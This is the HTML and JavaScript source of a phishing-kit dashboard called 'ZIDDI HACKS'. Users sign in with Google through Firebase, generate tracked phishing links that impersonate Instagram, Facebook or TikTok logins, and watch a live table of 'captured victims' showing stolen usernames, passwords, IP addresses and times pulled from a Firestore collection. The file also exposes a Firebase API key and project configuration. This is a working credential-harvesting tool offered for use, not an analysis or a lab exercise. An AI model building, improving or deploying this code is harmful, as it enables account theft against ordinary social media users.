<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZIDDI HACKS | Secure Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Exo+2:wght@400;600&display=swap');
        :root { --primary: #22c55e; --bg: #020617; --card: #0f172a; --neon: 0 0 15px rgba(34, 197, 94, 0.4); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Exo 2', sans-serif; }
        body { background: var(--bg); color: white; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }

        /* Auth Screen */
        .auth-container { text-align: center; background: var(--card); padding: 40px; border-radius: 30px; border: 1px solid var(--primary); box-shadow: var(--neon); width: 100%; max-width: 400px; }
        .google-btn { background: white; color: #000; padding: 12px 25px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; display: flex; align-items: center; gap: 10px; margin: 20px auto; transition: 0.3s; }
        .google-btn:hover { transform: scale(1.05); box-shadow: 0 0 20px rgba(255,255,255,0.2); }

        /* Dashboard (Hidden) */
        #adminUI { display: none; width: 100%; max-width: 900px; }
        .card { background: var(--card); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 20px; box-shadow: var(--neon); }
        .btn { width: 100%; padding: 15px; background: var(--primary); border: none; border-radius: 8px; font-weight: bold; cursor: pointer; font-family: 'Orbitron'; color: #000; margin-top: 10px; }
        
        .platform-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
        .p-btn { background: #1e293b; padding: 10px; border-radius: 10px; text-align: center; cursor: pointer; font-size: 11px; border: 1px solid transparent; }
        .p-btn.active { border-color: var(--primary); background: rgba(34, 197, 94, 0.1); }

        table { width: 100%; border-collapse: collapse; margin-top: 15px; }
        th { color: var(--primary); text-align: left; padding: 12px; border-bottom: 1px solid #334155; font-size: 12px; }
        td { padding: 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-size: 13px; }
        .copy-icon { color: var(--primary); cursor: pointer; margin-left: 8px; }

        /* Victim UI Hidden */
        #victimUI { display: none; }
    </style>
</head>
<body>

    <div id="authUI" class="auth-container">
        <h1 style="font-family:'Orbitron'; color:var(--primary);">ZIDDI HACKS</h1>
        <p style="font-size: 12px; opacity: 0.6; margin-top: 10px;">Secure Private Dashboard</p>
        <button class="google-btn" onclick="loginWithGoogle()">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c1/Google_%22G%22_logo.svg" width="20">
            Continue with Google
        </button>
    </div>

    <div id="adminUI">
        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
            <h2 style="font-family:'Orbitron'; color:var(--primary); font-size:18px;">DASHBOARD</h2>
            <div id="userInfo" style="font-size: 12px; display: flex; align-items: center; gap: 10px;">
                <span id="userName"></span>
                <button onclick="logout()" style="background:transparent; color:red; border:1px solid red; padding:4px 8px; border-radius:5px; cursor:pointer;">Logout</button>
            </div>
        </div>

        <div class="card">
            <h3 style="font-size:14px;">GENERATE PRIVATE PHISH LINK</h3>
            <div class="platform-grid">
                <div class="p-btn active" onclick="setPlat('Instagram', this)">Instagram</div>
                <div class="p-btn" onclick="setPlat('Facebook', this)">Facebook</div>
                <div class="p-btn" onclick="setPlat('TikTok', this)">TikTok</div>
            </div>
            <button class="btn" onclick="genLink()">GENERATE LINK</button>
            <div id="linkContainer" style="display:none; margin-top:15px; background:#000; padding:10px; border:1px dashed var(--primary); position:relative;">
                <p id="finalLink" style="font-size:10px; color:var(--primary); word-break:break-all;"></p>
                <button onclick="copyText()" style="position:absolute; right:5px; top:5px; background:var(--primary); font-size:9px; padding:2px 5px; border-radius:3px; border:none; cursor:pointer;">COPY</button>
            </div>
        </div>

        <div class="card" style="overflow-x:auto;">
            <h3 style="font-size:14px;">YOUR CAPTURED VICTIMS</h3>
            <table>
                <thead><tr><th>Platform</th><th>Credentials</th><th>Password</th><th>IP/Time</th></tr></thead>
                <tbody id="vBody"></tbody>
            </table>
        </div>
    </div>

    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-firestore-compat.js"></script>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCFy28nNtxhkjfpOd0aCfYkjHUwErh1WVQ",
            authDomain: "movie-1e6fc.firebaseapp.com",
            projectId: "movie-1e6fc",
            storageBucket: "movie-1e6fc.firebasestorage.app",
            messagingSenderId: "371616954594",
            appId: "1:371616954594:web:977d88ec7570df351246bb"
        };
        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();
        const provider = new firebase.auth.GoogleAuthProvider();

        let currentUser = null;
        let currentPlat = "Instagram";

        // Auth Functions
        function loginWithGoogle() {
            auth.signInWithPopup(provider).catch(e => alert(e.message));
        }

        function logout() { auth.signOut().then(() => location.reload()); }

        auth.onAuthStateChanged(user => {
            if(user) {
                currentUser = user;
                document.getElementById('authUI').style.display = 'none';
                document.getElementById('adminUI').style.display = 'block';
                document.getElementById('userName').innerText = user.displayName;
                loadVictims();
            }
        });

        // Tool Logic
        function setPlat(p, el) {
            currentPlat = p;
            document.querySelectorAll('.p-btn').forEach(b => b.classList.remove('active'));
            el.classList.add('active');
        }

        function genLink() {
            const baseUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
            const link = `${baseUrl}?login=${currentPlat}&ref=${currentUser.uid}`;
            document.getElementById('finalLink').innerText = link;
            document.getElementById('linkContainer').style.display = 'block';
        }

        function copyText() {
            const text = document.getElementById('finalLink').innerText;
            const el = document.createElement('textarea');
            el.value = text; document.body.appendChild(el); el.select();
            document.execCommand('copy'); document.body.removeChild(el);
            alert("Link Copied!");
        }

        function loadVictims() {
            db.collection('vault').where('ownerUID', '==', currentUser.uid).onSnapshot(snap => {
                const body = document.getElementById('vBody');
                body.innerHTML = "";
                snap.forEach(doc => {
                    const d = doc.data();
                    body.innerHTML += `<tr>
                        <td style="color:var(--primary)">${d.platform}</td>
                        <td>${d.user}</td>
                        <td><code>${d.pass}</code></td>
                        <td style="font-size:10px; opacity:0.6;">${d.ip}<br>${d.time}</td>
                    </tr>`;
                });
            });
        }
    </script>
</body>
</html>
